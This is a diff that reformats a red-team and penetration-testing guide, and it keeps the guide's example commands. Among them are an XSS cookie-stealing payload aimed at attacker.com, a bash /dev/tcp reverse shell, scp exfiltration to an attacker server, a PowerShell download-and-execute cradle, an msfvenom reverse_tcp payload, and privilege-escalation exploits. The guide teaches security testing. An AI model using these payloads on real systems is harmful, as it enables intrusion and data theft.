@@ -521,16 +521,11 @@ Thorough documentation and analysis of the gathered information are essential fo
 
 In a simulated attack scenario, proper documentation and analysis of the gathered information play a critical role in understanding the target system's vulnerabilities and potential attack vectors.
 
-1.
-**Documenting Gathered Information:** Create a comprehensive report that includes all the gathered information from the passive and active information gathering phases. This should include OSINT findings, DNS enumeration results, port scanning reports, and vulnerability scan results. Be sure to organize the information in a structured and easily understandable format.
-2.
-**Analyzing the Data:** Analyze the gathered information to identify potential attack vectors, weak points, and areas of focus for further penetration testing. Look for patterns, vulnerabilities, and any potential security gaps that could be exploited. Consider the interdependencies between different pieces of information to gain a holistic understanding of the target system.
-3.
-**Identifying Attack Vectors:** Based on the analysis, identify potential attack vectors that can be leveraged to gain unauthorized access or compromise the target system's security. This could include weak passwords, unpatched software, misconfigurations, or other vulnerabilities discovered during the reconnaissance phase.
-4.
-**Risk Prioritization:** Prioritize the identified attack vectors and targets based on their risk level. Assign a risk rating to each potential vulnerability or attack vector, considering factors such as impact severity, exploitability, and potential business impact. This prioritization will guide the subsequent stages of the red team engagement, focusing efforts on the most critical areas.
-5.
-**Clear Reporting:** Create a concise and clear report that summarizes the findings, identifies the potential attack vectors, and provides recommendations for remediation. Present the information in a manner that is understandable to both technical and non-technical stakeholders, ensuring that the report effectively communicates the risks and impacts of the identified vulnerabilities.
+1. **Documenting Gathered Information:** Create a comprehensive report that includes all the gathered information from the passive and active information gathering phases. This should include OSINT findings, DNS enumeration results, port scanning reports, and vulnerability scan results. Be sure to organize the information in a structured and easily understandable format.
+2. **Analyzing the Data:** Analyze the gathered information to identify potential attack vectors, weak points, and areas of focus for further penetration testing. Look for patterns, vulnerabilities, and any potential security gaps that could be exploited. Consider the interdependencies between different pieces of information to gain a holistic understanding of the target system.
+3. **Identifying Attack Vectors:** Based on the analysis, identify potential attack vectors that can be leveraged to gain unauthorized access or compromise the target system's security. This could include weak passwords, unpatched software, misconfigurations, or other vulnerabilities discovered during the reconnaissance phase.
+4. **Risk Prioritization:** Prioritize the identified attack vectors and targets based on their risk level. Assign a risk rating to each potential vulnerability or attack vector, considering factors such as impact severity, exploitability, and potential business impact. This prioritization will guide the subsequent stages of the red team engagement, focusing efforts on the most critical areas.
+5. **Clear Reporting:** Create a concise and clear report that summarizes the findings, identifies the potential attack vectors, and provides recommendations for remediation. Present the information in a manner that is understandable to both technical and non-technical stakeholders, ensuring that the report effectively communicates the risks and impacts of the identified vulnerabilities.
 
 Remember to maintain a meticulous record of the information gathered during the reconnaissance phase, as it forms the basis for the subsequent stages of the red team engagement. Proper documentation and analysis will facilitate effective decision-making, enhance the overall penetration testing process, and help the organization improve its security posture.
 
@@ -548,8 +543,6 @@ OpenVAS is a robust open-source vulnerability scanner designed to identify secur
 
 * Command Line Example:
 
-ruby
-
 ```
 <span class="hljs-comment"># Start an OpenVAS vulnerability scan</span>
 <span class="hljs-variable">$ </span>omp -u admin -w password --xml=<span class="hljs-string">"<get_tasks/>"</span>
@@ -566,8 +559,6 @@ Nessus is a widely recognized commercial vulnerability scanner known for its ext
 
 * Command Line Example:
 
-ruby
-
 ```
 <span class="hljs-comment"># Start a Nessus vulnerability scan</span>
 <span class="hljs-variable">$ </span>nessuscli scan new target=<span class="hljs-string">"192.168.0.1"</span> template=<span class="hljs-string">"basic"</span> name=<span class="hljs-string">"My Scan"</span>
@@ -583,8 +574,6 @@ ruby
 Nikto is an open-source web server scanner that specializes in finding common web server vulnerabilities and misconfigurations. It focuses on performing comprehensive scans of web servers and generating detailed reports on identified issues. Nikto can be operated through the command line.
 
 * Command Line Example:
-
-ruby
 
 ```
 <span class="hljs-comment"># Scan a target web server using Nikto</span>
@@ -617,8 +606,6 @@ Manual network scanning and enumeration techniques go beyond automated port scan
 
 * Command Line Example:
 
-ruby
-
 ```
 <span class="hljs-comment"># Perform a comprehensive Nmap scan</span>
 <span class="hljs-variable">$ </span>nmap -p- -sV -sC -oA output_file target_ip
@@ -636,31 +623,21 @@ Thorough documentation and reporting of vulnerabilities are essential for effect
 
 When documenting vulnerabilities, ensure that the following information is captured:
 
-*
-Vulnerability Details: Include the vulnerability name, severity level, and Common Vulnerability Scoring System (CVSS) score, if available. This information helps stakeholders assess the impact and prioritize remediation efforts.
-*
-Technical Description and Impact: Provide a detailed technical description of the vulnerability, including its root cause, affected components, and potential impact on the target system. This information helps stakeholders understand the nature and potential consequences of the vulnerability.
-*
-Steps to Reproduce: Document the steps taken to reproduce the vulnerability. This information is important for validating and verifying the vulnerability during the remediation process and can aid developers or system administrators in understanding the specific conditions required for exploitation.
-*
-Recommended Mitigation Strategies: Offer clear and actionable mitigation strategies or remediation steps to address the identified vulnerabilities. Include recommendations for implementing patches, configuration changes, or other security controls. These recommendations should be practical and prioritized based on the severity and potential impact of the vulnerabilities.
+* Vulnerability Details: Include the vulnerability name, severity level, and Common Vulnerability Scoring System (CVSS) score, if available. This information helps stakeholders assess the impact and prioritize remediation efforts.
+* Technical Description and Impact: Provide a detailed technical description of the vulnerability, including its root cause, affected components, and potential impact on the target system. This information helps stakeholders understand the nature and potential consequences of the vulnerability.
+* Steps to Reproduce: Document the steps taken to reproduce the vulnerability. This information is important for validating and verifying the vulnerability during the remediation process and can aid developers or system administrators in understanding the specific conditions required for exploitation.
+* Recommended Mitigation Strategies: Offer clear and actionable mitigation strategies or remediation steps to address the identified vulnerabilities. Include recommendations for implementing patches, configuration changes, or other security controls. These recommendations should be practical and prioritized based on the severity and potential impact of the vulnerabilities.
 
 **4.3.2 Vulnerability Assessment Report:**
 
 Generate a comprehensive vulnerability assessment report to consolidate and present the documented vulnerabilities. The report should be well-structured and provide a clear overview of the security posture. Consider including the following sections:
 
-*
-Executive Summary: Provide a high-level overview of the assessment, including key findings, prioritized vulnerabilities, and recommended actions. This section is intended for non-technical stakeholders and should highlight the most critical issues and their potential business impact.
-*
-Methodology: Explain the assessment methodology, including the techniques, tools, and processes used during the assessment. This section helps stakeholders understand the approach and scope of the assessment.
-*
-Vulnerability Details: Present detailed information about each identified vulnerability, including its name, severity, technical description, and impact. Include any relevant evidence or proof-of-concept (POC) examples to support the findings.
-*
-Recommendations: Offer clear and concise recommendations for addressing the identified vulnerabilities. Provide step-by-step instructions or guidelines for implementing the recommended mitigation strategies.
-*
-Risk Assessment: Assess the overall risk level posed by the identified vulnerabilities and prioritize them based on their severity and potential impact. This section helps stakeholders understand the relative importance and urgency of each vulnerability.
-*
-Conclusion: Summarize the key findings, reiterate the recommended actions, and emphasize the importance of addressing the identified vulnerabilities.
+* Executive Summary: Provide a high-level overview of the assessment, including key findings, prioritized vulnerabilities, and recommended actions. This section is intended for non-technical stakeholders and should highlight the most critical issues and their potential business impact.
+* Methodology: Explain the assessment methodology, including the techniques, tools, and processes used during the assessment. This section helps stakeholders understand the approach and scope of the assessment.
+* Vulnerability Details: Present detailed information about each identified vulnerability, including its name, severity, technical description, and impact. Include any relevant evidence or proof-of-concept (POC) examples to support the findings.
+* Recommendations: Offer clear and concise recommendations for addressing the identified vulnerabilities. Provide step-by-step instructions or guidelines for implementing the recommended mitigation strategies.
+* Risk Assessment: Assess the overall risk level posed by the identified vulnerabilities and prioritize them based on their severity and potential impact. This section helps stakeholders understand the relative importance and urgency of each vulnerability.
+* Conclusion: Summarize the key findings, reiterate the recommended actions, and emphasize the importance of addressing the identified vulnerabilities.
 
 By following meticulous documentation and reporting practices, you provide actionable information to the relevant stakeholders and facilitate the resolution of identified vulnerabilities. Clear and comprehensive documentation promotes effective communication, enables informed decision-making, and helps drive the remediation process.
 
@@ -678,8 +655,6 @@ SQL injection is a technique where malicious SQL statements are inserted into an
 
 Example: Consider a login form vulnerable to SQL injection:
 
-vbnet
-
 ```
 Username: admin<span class="hljs-comment">' OR '1'='1</span>
 Password: any_password
@@ -695,8 +670,6 @@ Cross-Site Scripting (XSS) involves injecting malicious scripts into web pages v
 
 Example: Injecting a script that steals user cookies:
 
-html
-
 ```
 <span class="hljs-tag"><<span class="hljs-title">script</span>></span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">'http://attacker.com/steal.php?cookie='</span>+<span class="hljs-built_in">document</span>.cookie;</span><span class="hljs-tag"></<span class="hljs-title">script</span>></span>
 ```
@@ -710,8 +683,6 @@ Online Resource: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owa
 File inclusion vulnerabilities allow an attacker to include arbitrary files on a server, leading to unauthorized access, remote code execution, or sensitive information disclosure. These vulnerabilities typically occur when an application includes files based on user-supplied input without proper validation or sanitization.
 
 Example: Exploiting a local file inclusion vulnerability to read sensitive files:
-
-bash
 
 ```
 http://target.com/?page=../../../../etc/passwd
@@ -733,8 +704,6 @@ Remote Code Execution (RCE) vulnerabilities allow an attacker to execute arbitra
 
 Example: Exploiting an RCE vulnerability in a vulnerable version of Apache Struts:
 
-ruby
-
 ```
 <span class="hljs-variable">$ </span>curl -<span class="hljs-constant">X</span> <span class="hljs-constant">POST</span> -d <span class="hljs-string">'command=whoami'</span> <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/target.com/struts</span>_vuln.action
 ```
@@ -748,8 +717,6 @@ Online Resource: [Metasploit Unleashed - Exploit Development](https://www.metasp
 Weak network services, such as outdated versions of SSH, FTP, or SMB, can be exploited using known vulnerabilities or brute-force attacks. Attackers target these services to gain unauthorized access to systems or extract sensitive data.
 
 Example: Exploiting a vulnerable version of FTP with Metasploit:
-
-arduino
 
 ```
 msfconsole
@@ -767,8 +734,6 @@ Online Resource: [Metasploit Framework Documentation](https://www.metasploitunle
 Man-in-the-Middle (MitM) attacks involve intercepting and altering network traffic between a target system and its intended destination. Attackers can capture sensitive information, inject malicious content, or manipulate communication between systems.
 
 Example: Performing a MitM attack using Ettercap:
-
-bash
 
 ```
 ettercap -T -q -M arp:remote /target_ip/ /gateway_ip/
@@ -790,8 +755,6 @@ Privilege escalation involves elevating user privileges on a compromised system 
 
 Example: Checking for common privilege escalation vulnerabilities using LinEnum:
 
-shell
-
 ```
 $ ./LinEnum.sh -e /tmp/output
 ```
@@ -805,8 +768,6 @@ Online Resource: [GTFOBins - GTFO Techniques](https://gtfobins.github.io/)
 Lateral movement refers to the process of expanding access within a network by compromising additional systems. Once a foothold is gained, attackers leverage techniques like pass-the-hash, lateral exploitation, or pivoting to move laterally across the network. This enables them to explore and compromise other systems within the network environment.
 
 Example: Using Metasploit's `psexec` module for lateral movement:
-
-arduino
 
 ```
 msfconsole
@@ -826,8 +787,6 @@ Online Resource: [Metasploit Unleashed - Pivoting](https://www.metasploitunleash
 Data exfiltration involves transferring sensitive data from a compromised system to an attacker-controlled location. Attackers employ various techniques such as covert channels, encrypted tunnels, or steganography to conceal and transmit the data. Data exfiltration can occur through network channels, removable media, or even through manipulating legitimate communication channels.
 
 Example: Exfiltrating data using the `scp` command:
-
-typescript
 
 ```
 $ scp sensitive_file.txt <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a8c9dcdcc9cbc3cddae8cdd0c9c5d8c4cd86cbc7c5">[email&#xA0;protected]</a>:<span class="hljs-regexp">/path/</span>on/attacker/server
@@ -853,8 +812,6 @@ Deploying backdoors or shells provides remote access to the compromised system, 
 
 Example: Generating a reverse shell using Netcat:
 
-javascript
-
 ```
 Attacker: nc -nvlp <span class="hljs-number">4444</span>
 Target: <span class="hljs-regexp">/bin/</span>bash -i >& <span class="hljs-regexp">/dev/</span>tcp/attacker_ip/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>>&<span class="hljs-number">1</span>
@@ -869,8 +826,6 @@ Online Resource: [Penetration Testing Execution Standard (PTES) - Post Exploitat
 Establishing persistence mechanisms ensures that the compromised system retains the ability to be accessed even after reboots or system updates. Attackers employ various techniques to achieve persistence, such as modifying startup scripts, creating scheduled tasks, or leveraging rootkits. These mechanisms ensure that the attacker can regain access to the compromised system automatically.
 
 Example: Adding a persistent cron job:
-
-sql
 
 ```
 $ crontab -e
@@ -894,8 +849,6 @@ System enumeration involves collecting detailed information about the compromise
 
 Example: Gathering system information using the `systeminfo` command on Windows:
 
-makefile
-
 ```
 C:\> systeminfo
 ```
@@ -909,8 +862,6 @@ Online Resource: [Windows Command Line - System Information](https://docs.micros
 Network enumeration focuses on gathering information about the network infrastructure, including IP addresses, active hosts, network shares, and user accounts. This information helps attackers identify potential targets, network services, and possible avenues for lateral movement.
 
 Example: Enumerating network information using the `ifconfig` and `arp` commands on Linux:
-
-ruby
 
 ```
 <span class="hljs-variable">$ </span>ifconfig
@@ -927,8 +878,6 @@ Exploring the compromised system's file system helps attackers identify valuable
 
 Example: Listing files and directories using the `ls` command on Linux:
 
-shell
-
 ```
 $ ls -l
 ```
@@ -942,8 +891,6 @@ Online Resource: [Linux Command Line - File and Directory Operations](https://li
 LinPEAS is a widely used tool for performing privilege escalation audits on Linux systems. It automates the process of gathering information about the compromised system and helps identify potential privilege escalation vectors.
 
 Example: Running LinPEAS script on a compromised Linux system:
-
-shell
 
 ```
 $ ./linpeas.sh
@@ -965,8 +912,6 @@ Kernel exploits target vulnerabilities in the operating system's kernel to gain 
 
 Example: Exploiting a vulnerable kernel using the Dirty COW exploit:
 
-shell
-
 ```
 $ gcc -pthread dirtycow.c -o dirtycow
 $ ./dirtycow
@@ -982,8 +927,6 @@ Misconfigured file permissions can provide an opportunity for privilege escalati
 
 Example: Checking for world-writable files using the `find` command on Linux:
 
-lua
-
 ```
 $ find / -perm -<span class="hljs-number">2</span> -<span class="hljs-built_in">type</span> f
 ```
@@ -997,8 +940,6 @@ Online Resource: [GTFOBins - GTFO Techniques](https://gtfobins.github.io/)
 Weak service configurations, such as misconfigured sudo rules or vulnerable service configurations, can be exploited to escalate privileges within the system.
 
 Example: Exploiting a misconfigured sudo rule to gain root access:
-
-ruby
 
 ```
 <span class="hljs-variable">$ </span>sudo -u<span class="hljs-comment">#-1 /bin/bash</span>
@@ -1112,132 +1053,119 @@ Defense evasion techniques aim to bypass or circumvent security controls, while 
 
 **8.1.1 Encryption and Obfuscation:**
 
-*
 Reason: Encryption and obfuscation techniques are used to conceal malicious payloads, command and control (C2) communications, or exploit code from detection.
-*
+
 Example: Encrypting a payload using OpenSSL:
-csharp
 
 ```
 $ openssl enc -aes-<span class="hljs-number">256</span>-cbc -salt -<span class="hljs-keyword">in</span> payload.txt -<span class="hljs-keyword">out</span> encrypted_payload.txt
 ```
-*
+
 Countermeasure: Implement network traffic monitoring and analysis tools capable of identifying encrypted or obfuscated traffic patterns. Employ advanced threat detection solutions that can analyze encrypted traffic without decrypting it.
 
 **8.1.2 Anti-Virus Evasion:**
 
-*
 Reason: Anti-virus evasion techniques help avoid detection by traditional anti-virus software and other security controls.
-*
+
 Example: Modifying a payload to evade signature-based detection:
-shell
 
 ```
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o evasive_payload.exe
 ```
-*
+
 Countermeasure: Utilize behavior-based anti-malware solutions that can detect and block malicious activities based on their behavior, rather than relying solely on signature-based detection.
 
 **8.1.3 Fileless Malware:**
 
-*
 Reason: Fileless malware resides in memory, leaving no traces on disk and evading traditional file-based detection mechanisms.
-*
+
 Example: Running PowerShell commands directly in memory:
-scss
 
 ```
 powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/malicious_script')"
 ```
-*
 Countermeasure: Implement application control solutions that restrict the execution of scripting engines, monitor PowerShell usage, and detect suspicious memory-based activities.
 
 **8.1.4 Rootkit Techniques:**
 
-*
 Reason: Rootkit techniques manipulate the operating system to hide the presence of malicious activities and maintain persistence.
-*
+
 Example: Hiding a process using the rootkit technique:
-shell
 
 ```
 $ echo "my_process" > /proc/<pid>/hide
 ```
-*
+
 Countermeasure: Regularly update and patch operating systems and applications to prevent known vulnerabilities that rootkits exploit. Employ integrity checking mechanisms and security tools capable of detecting rootkit-like behavior.
 
 **8.1.5 Domain Generation Algorithms (DGAs):**
 
-*
 Reason: DGAs generate domain names dynamically, making it challenging to block or blacklist C2 communications.
-*
+
 Example: Generating a list of domain names using a DGA algorithm:
-shell
 
 ```
 $ python dga_generator.py -date 20230525
 ```
-*
+
 Countermeasure: Implement DNS monitoring and anomaly detection systems that can identify unusual or suspicious domain name generation patterns. Employ threat intelligence feeds to identify known malicious domains associated with DGAs.
 
 ### 8.2 Countermeasures
 
 **8.2.1 Network Traffic Monitoring:**
 
-*
 Reason: Comprehensive network traffic monitoring allows for the detection of anomalous activities, encrypted communications, and communication with suspicious or malicious domains.
-*
+
 Example: Using Wireshark to capture and analyze network traffic:
-ruby
 
 ```
 <span class="hljs-variable">$ </span>wireshark
 ```
-*
+
 Countermeasure: Employ network intrusion detection and prevention systems (IDS/IPS) that can analyze network traffic in real-time, detect anomalies, and block suspicious communications.
 
 **8.2.2 Endpoint Protection and Response:**
 
-*
 Reason: Endpoint protection and response solutions offer real-time monitoring, behavior-based threat detection, and incident response capabilities on individual endpoints.
-*
+
 Example: Configuring an endpoint protection agent:
-ruby
 
 ```
 <span class="hljs-variable">$ </span>sudo apt-get install endpoint-protection-agent
 <span class="hljs-variable">$ </span>endpoint-protection-agent configure
 ```
-*
+
 Countermeasure: Implement endpoint protection solutions that employ machine learning, behavior analysis, and threat intelligence to identify and respond to malicious activities on endpoints.
 
 **8.2.3 User Awareness and Training:**
 
-* Reason: Educating users about common attack techniques, social engineering, and the importance of adhering to security policies can significantly reduce the effectiveness of defense evasion techniques.
-* Example: Conducting regular security awareness training sessions for employees.
-* Countermeasure: Develop a comprehensive security awareness program that includes phishing simulations, training modules, and ongoing communication to reinforce secure behavior.
+Reason: Educating users about common attack techniques, social engineering, and the importance of adhering to security policies can significantly reduce the effectiveness of defense evasion techniques.
+
+Example: Conducting regular security awareness training sessions for employees.
+
+Countermeasure: Develop a comprehensive security awareness program that includes phishing simulations, training modules, and ongoing communication to reinforce secure behavior.
 
 **8.2.4 System Hardening:**
 
-*
 Reason: Proper system hardening helps reduce attack surface, limits potential vulnerabilities, and strengthens overall defense capabilities.
-*
+
 Example: Disabling unnecessary services and closing unused ports:
-shell
 
 ```
 $ systemctl stop <service>
 $ systemctl disable <service>
 $ ufw deny <port>
 ```
-*
+
 Countermeasure: Follow industry best practices for system hardening, such as removing unnecessary software, applying least-privilege principles, and regular patching and updates.
 
 **8.2.5 Incident Response and Recovery:**
 
-* Reason: Establishing an effective incident response plan and implementing robust backup and recovery mechanisms can minimize the impact of successful attacks and facilitate quick recovery.
-* Example: Developing an incident response playbook outlining step-by-step procedures for different attack scenarios.
-* Countermeasure: Create an incident response plan that includes clear roles and responsibilities, communication protocols, and procedures for isolating compromised systems and restoring services.
+Reason: Establishing an effective incident response plan and implementing robust backup and recovery mechanisms can minimize the impact of successful attacks and facilitate quick recovery.
+
+Example: Developing an incident response playbook outlining step-by-step procedures for different attack scenarios.
+
+Countermeasure: Create an incident response plan that includes clear roles and responsibilities, communication protocols, and procedures for isolating compromised systems and restoring services.
 
 By understanding defense evasion techniques and implementing the appropriate countermeasures, organizations can significantly enhance their security posture and protect against red team attacks.
 
@@ -1447,43 +1375,23 @@ Adhering to legal and ethical considerations is not only crucial for maintaining
 
 ## Resources
 
-1.
-**HackTricks**: A community-driven resource providing a comprehensive collection of tricks and techniques for various aspects of pentesting, including privilege escalation, post-exploitation, web applications, and more. Website: [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)
-2.
-**[Pentest-Tools.com](http://Pentest-Tools.com)**: An online platform offering a wide range of tools and resources for penetration testing and vulnerability assessment. It includes tools for information gathering, scanning, exploitation, and reporting. Website: [https://pentest-tools.com/](https://pentest-tools.com/)
-3.
-**PentestMonkey**: A website dedicated to sharing practical examples and cheat sheets for various aspects of pentesting. It covers topics such as shell scripting, SQL injection, reverse shells, and more. Website: [https://pentestmonkey.net/](https://pentestmonkey.net/)
-4.
-**OWASP**: The Open Web Application Security Project (OWASP) provides numerous resources for web application security, including guides, tools, and best practices. It also maintains the OWASP Top Ten Project, highlighting the most critical web application security risks. Website: [https://owasp.org/](https://owasp.org/)
-5.
-**Exploit-DB**: A comprehensive database of exploits and vulnerabilities, including both remote and local exploits for various platforms and applications. It provides detailed information, including vulnerability descriptions, exploit code, and references. Website: [https://www.exploit-db.com/](https://www.exploit-db.com/)
-6.
-**Metasploit Unleashed**: A free online resource that serves as a comprehensive guide to using the Metasploit Framework. It covers various modules, techniques, and methodologies for penetration testing and exploitation. Website: [https://www.metasploitunleashed.com/](https://www.metasploitunleashed.com/)
-7.
-**PayloadsAllTheThings**: A GitHub repository containing a vast collection of payloads, bypass techniques, guides, and other resources related to penetration testing and security assessment. It covers various areas such as web applications, networks, reverse shells, and more. Repository: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-8.
-**SecLists**: A collection of multiple lists related to security assessment and penetration testing. It includes lists of passwords, usernames, web shells, common vulnerabilities, and more. Repository: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
-9.
-**PacketLife Cheat Sheets**: A compilation of cheat sheets covering a wide range of networking and security topics, including TCP/IP protocols, Linux commands, Wireshark, cryptography, and more. Website: [https://packetlife.net/library/cheat-sheets/](https://packetlife.net/library/cheat-sheets/)
-10.
-**SANS Institute**: A well-known organization in the field of information security that offers a wealth of resources, including whitepapers, research papers, webcasts, and security training courses. It covers various topics, including penetration testing, incident response, network defense, and more. Website: [https://www.sans.org/](https://www.sans.org/)
-11.
-**Nmap Cheat Sheet**: A handy reference guide for using Nmap, a popular and powerful network scanning tool. It provides command examples and explanations for various scanning techniques. Website: [https://www.stationx.net/nmap-cheat-sheet/](https://www.stationx.net/nmap-cheat-sheet/)
-12.
-**OWASP WebGoat**: A deliberately insecure web application designed for hands-on learning and practicing web application security testing techniques. It provides a safe environment to explore common vulnerabilities and attack scenarios. Website: [https://www.owasp.org/index.php/OWASP_WebGoat_Project](https://www.owasp.org/index.php/OWASP_WebGoat_Project)
-13.
-**VulnHub**: A platform that hosts a collection of vulnerable virtual machines (VMs) for practicing and honing penetration testing skills. These VMs simulate real-world scenarios and contain intentionally created vulnerabilities. Website: [https://www.vulnhub.com/](https://www.vulnhub.com/)
-14.
-**Exploit Database (EDB)**: A comprehensive online repository of exploits, vulnerabilities, and security papers. It offers a vast collection of exploit code and detailed technical information for various systems and applications. Website: [https://www.exploit-db.com/](https://www.exploit-db.com/)
-15.
-**Cybrary**: An online platform that provides a wide range of free and paid cybersecurity courses, including topics such as ethical hacking, penetration testing, and network security. It offers video lectures, labs, and assessments to enhance practical skills. Website: [https://www.cybrary.it/](https://www.cybrary.it/)
-16.
-**HackerOne Hacktivity**: A public archive of disclosed vulnerabilities and bug bounty reports from various organizations. It offers insights into real-world vulnerabilities and their impact, providing valuable knowledge for red teamers. Website: [https://hackerone.com/hacktivity](https://hackerone.com/hacktivity)
-17.
-**Penetration Testing Execution Standard (PTES)**: A standard framework for performing penetration testing. It outlines the phases, methodologies, and deliverables involved in a comprehensive penetration testing engagement. Website: [http://www.pentest-standard.org/](http://www.pentest-standard.org/)
-18.
-**The Web Application Hacker's Handbook (WAHH) Labs**: A companion website for "The Web Application Hacker's Handbook," offering additional labs and exercises to practice web application security testing techniques. Website: [https://portswigger.net/web-security](https://portswigger.net/web-security)
-19.
-**The Hacker Playbook Series**: A series of practical guides written by Peter Kim, providing step-by-step approaches and methodologies for various aspects of penetration testing and red teaming. Website: [https://thehackerplaybook.com/](https://thehackerplaybook.com/)
-20.
-**MITRE ATT&CK**: A globally accessible knowledge base maintained by MITRE, cataloging adversary tactics, techniques, and procedures (TTPs). It provides insights into common attack techniques used by threat actors and assists in enhancing defensive strategies. Website: [https://attack.mitre.org/](https://attack.mitre.org/)
+1. **HackTricks**: A community-driven resource providing a comprehensive collection of tricks and techniques for various aspects of pentesting, including privilege escalation, post-exploitation, web applications, and more. Website: [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)
+2. **[Pentest-Tools.com](http://Pentest-Tools.com)**: An online platform offering a wide range of tools and resources for penetration testing and vulnerability assessment. It includes tools for information gathering, scanning, exploitation, and reporting. Website: [https://pentest-tools.com/](https://pentest-tools.com/)
+3. **PentestMonkey**: A website dedicated to sharing practical examples and cheat sheets for various aspects of pentesting. It covers topics such as shell scripting, SQL injection, reverse shells, and more. Website: [https://pentestmonkey.net/](https://pentestmonkey.net/)
+4. **OWASP**: The Open Web Application Security Project (OWASP) provides numerous resources for web application security, including guides, tools, and best practices. It also maintains the OWASP Top Ten Project, highlighting the most critical web application security risks. Website: [https://owasp.org/](https://owasp.org/)
+5. **Exploit-DB**: A comprehensive database of exploits and vulnerabilities, including both remote and local exploits for various platforms and applications. It provides detailed information, including vulnerability descriptions, exploit code, and references. Website: [https://www.exploit-db.com/](https://www.exploit-db.com/)
+6. **Metasploit Unleashed**: A free online resource that serves as a comprehensive guide to using the Metasploit Framework. It covers various modules, techniques, and methodologies for penetration testing and exploitation. Website: [https://www.metasploitunleashed.com/](https://www.metasploitunleashed.com/)
+7. **PayloadsAllTheThings**: A GitHub repository containing a vast collection of payloads, bypass techniques, guides, and other resources related to penetration testing and security assessment. It covers various areas such as web applications, networks, reverse shells, and more. Repository: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+8. **SecLists**: A collection of multiple lists related to security assessment and penetration testing. It includes lists of passwords, usernames, web shells, common vulnerabilities, and more. Repository: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
+9. **PacketLife Cheat Sheets**: A compilation of cheat sheets covering a wide range of networking and security topics, including TCP/IP protocols, Linux commands, Wireshark, cryptography, and more. Website: [https://packetlife.net/library/cheat-sheets/](https://packetlife.net/library/cheat-sheets/)
+10. **SANS Institute**: A well-known organization in the field of information security that offers a wealth of resources, including whitepapers, research papers, webcasts, and security training courses. It covers various topics, including penetration testing, incident response, network defense, and more. Website: [https://www.sans.org/](https://www.sans.org/)
+11. **Nmap Cheat Sheet**: A handy reference guide for using Nmap, a popular and powerful network scanning tool. It provides command examples and explanations for various scanning techniques. Website: [https://www.stationx.net/nmap-cheat-sheet/](https://www.stationx.net/nmap-cheat-sheet/)
+12. **OWASP WebGoat**: A deliberately insecure web application designed for hands-on learning and practicing web application security testing techniques. It provides a safe environment to explore common vulnerabilities and attack scenarios. Website: [https://www.owasp.org/index.php/OWASP_WebGoat_Project](https://www.owasp.org/index.php/OWASP_WebGoat_Project)
+13. **VulnHub**: A platform that hosts a collection of vulnerable virtual machines (VMs) for practicing and honing penetration testing skills. These VMs simulate real-world scenarios and contain intentionally created vulnerabilities. Website: [https://www.vulnhub.com/](https://www.vulnhub.com/)
+14. **Exploit Database (EDB)**: A comprehensive online repository of exploits, vulnerabilities, and security papers. It offers a vast collection of exploit code and detailed technical information for various systems and applications. Website: [https://www.exploit-db.com/](https://www.exploit-db.com/)
+15. **Cybrary**: An online platform that provides a wide range of free and paid cybersecurity courses, including topics such as ethical hacking, penetration testing, and network security. It offers video lectures, labs, and assessments to enhance practical skills. Website: [https://www.cybrary.it/](https://www.cybrary.it/)
+16. **HackerOne Hacktivity**: A public archive of disclosed vulnerabilities and bug bounty reports from various organizations. It offers insights into real-world vulnerabilities and their impact, providing valuable knowledge for red teamers. Website: [https://hackerone.com/hacktivity](https://hackerone.com/hacktivity)
+17. **Penetration Testing Execution Standard (PTES)**: A standard framework for performing penetration testing. It outlines the phases, methodologies, and deliverables involved in a comprehensive penetration testing engagement. Website: [http://www.pentest-standard.org/](http://www.pentest-standard.org/)
+18. **The Web Application Hacker's Handbook (WAHH) Labs**: A companion website for "The Web Application Hacker's Handbook," offering additional labs and exercises to practice web application security testing techniques. Website: [https://portswigger.net/web-security](https://portswigger.net/web-security)
+19. **The Hacker Playbook Series**: A series of practical guides written by Peter Kim, providing step-by-step approaches and methodologies for various aspects of penetration testing and red teaming. Website: [https://thehackerplaybook.com/](https://thehackerplaybook.com/)
+20. **MITRE ATT&CK**: A globally accessible knowledge base maintained by MITRE, cataloging adversary tactics, techniques, and procedures (TTPs). It provides insights into common attack techniques used by threat actors and assists in enhancing defensive strategies. Website: [https://attack.mitre.org/](https://attack.mitre.org/)
